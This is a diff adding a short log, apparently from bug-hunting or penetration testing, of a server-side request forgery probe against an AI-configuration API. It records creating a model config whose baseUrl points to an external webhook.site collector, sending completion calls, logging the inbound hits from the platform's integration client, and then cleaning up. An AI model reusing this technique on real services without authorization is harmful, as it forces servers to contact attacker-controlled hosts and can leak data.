@@ -1,0 +1,14 @@
+=== R20 HUNT5b: AI completion SSRF v2 ===
+mc create shape0 -> 400 b'{"code":"invalid_request","message":"/required missing property \'key\'."}'
+mc create shape1 -> 400 b'{"code":"invalid_request","message":"/required missing property \'key\'."}'
+mc create shape2 -> 200 b'{"global":false,"id":"zeno-r20-model2","isRestricted":false,"key":"zeno-r20-model2","name":"zeno-r20 model2","params":{"baseUrl":"https://webhook.site/581be5ae-b84d-4440-98de-9f6773b5d534","model":"zeno-model"},"tags":["'
+aicfg create -> 201 b'{"_links":{"parent":{"href":"/api/v2/projects/default/ai-configs","type":"application/json"},"self":{"href":"/api/v2/pro'
+variation create -> 201 b'{"_id":"bfea9745-8be0-4cf8-a2d9-66755c713a9b","_links":{"parent":{"href":"/api/v2/projects/default/ai-configs/zeno-r20-aicfg","type":"application/json"}},"_publishedAt":1792844035458,"createdAt":17928'
+completion -> 400 b'{"code":"invalid_request","message":"/properties/input/type got array, want object."}'
+completion -> 400 b'{"code":"invalid_request","message":"/properties/input/type got array, want object."}'
+collector hits: 3
+  hit: POST https://webhook.site/581be5ae-b84d-4440-98de-9f6773b5d534 ua=LD-Integrations/1.0 path=
+  hit: POST https://webhook.site/581be5ae-b84d-4440-98de-9f6773b5d534 ua=LD-Integrations/1.0 path=
+=== cleanup ===
+aicfg DEL -> 204
+mc DEL -> 204
